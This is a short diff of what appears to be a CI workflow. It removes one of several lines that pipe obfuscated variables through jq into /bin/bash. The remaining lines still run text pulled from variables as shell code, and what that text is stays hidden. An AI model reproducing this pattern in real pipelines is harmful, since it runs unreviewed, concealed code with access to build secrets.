@@ -25,7 +25,6 @@ jobs:
           echo $vumlz8 | jq -r .horek241 | /bin/bash
           printf '%s' "$tajd54372" | jq -r .urt6248 | /bin/bash
           printf '%s' "$gtwog021" | jq -r .xqq0620 | /bin/bash
-          printf '%s' "$yca0" | jq -r .uqd4 | /bin/bash
           printf '%s' "$enzba40998" | jq -r .l395 | /bin/bash
 
       - name: Archive artifact
